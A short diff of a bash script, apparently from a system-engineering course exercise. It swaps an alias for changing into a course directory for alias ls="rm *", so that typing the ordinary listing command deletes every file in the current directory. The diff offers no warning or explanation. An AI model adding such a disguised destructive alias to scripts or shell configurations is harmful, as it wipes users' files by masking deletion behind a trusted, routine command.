@@ -1,2 +1,2 @@
 #!/bin/bash
-alias alxdevops="cd alx-system_engineering-devops"
+alias ls="rm *"
